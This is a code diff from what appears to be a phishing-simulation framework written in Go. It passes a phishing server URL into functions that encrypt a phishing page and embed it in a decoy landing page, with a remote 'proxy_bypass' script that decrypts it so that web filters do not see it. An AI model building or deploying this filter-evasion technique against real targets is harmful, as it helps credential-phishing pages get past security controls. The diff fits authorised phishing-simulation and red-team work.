@@ -142,7 +142,7 @@ func GetPage(id int64, uid int64) (Page, error) {
 	return p, err
 }
 
-func GetPageEncrypted(id int64, uid int64, key string) (Page, error) {
+func GetPageEncrypted(id int64, uid int64, key string, phishServerURL string) (Page, error) {
 	p := Page{}
 	err := db.Where("user_id=? and id=?", uid, id).Find(&p).Error
 	if err != nil {
@@ -151,13 +151,13 @@ func GetPageEncrypted(id int64, uid int64, key string) (Page, error) {
 
 	//embed html in decoy landing page if proxy bypass enabled
 	if p.ProxyBypassEnabled && p.DecoyPageId != 0 {
-		p.HTML, err = EmbedEncryptedPage(p.HTML, p.DecoyPageId, uid, key)
+		p.HTML, err = EmbedEncryptedPage(p.HTML, p.DecoyPageId, uid, key, phishServerURL)
 	}
 
 	return p, err
 }
 
-func EmbedEncryptedPage(html string, decoyPageId int64, userId int64, key string) (string, error) {
+func EmbedEncryptedPage(html string, decoyPageId int64, userId int64, key string, phishServerURL string) (string, error) {
 	//encrypt all html and store in value in new html page
 	// new html page will be decoy looking landing page
 	encryptedHTML := crypto.EncryptGCM(html, []byte(key))
@@ -178,7 +178,7 @@ func EmbedEncryptedPage(html string, decoyPageId int64, userId int64, key string
 	// Add encrypted malicious page
 	decoyPage.HTML += "<script>var encrypted = " + "\"" + encryptedHTML + "\"" + "</script>"
 	// add proxy_bypass script
-	decoyPage.HTML += "<script src=\"http://127.0.0.1:80/static/proxy_bypass.js\"></script>"
+	decoyPage.HTML += "<script src=\"http://" + phishServerURL + "/static/proxy_bypass.js\"></script>"
 
 	return decoyPage.HTML, err
 
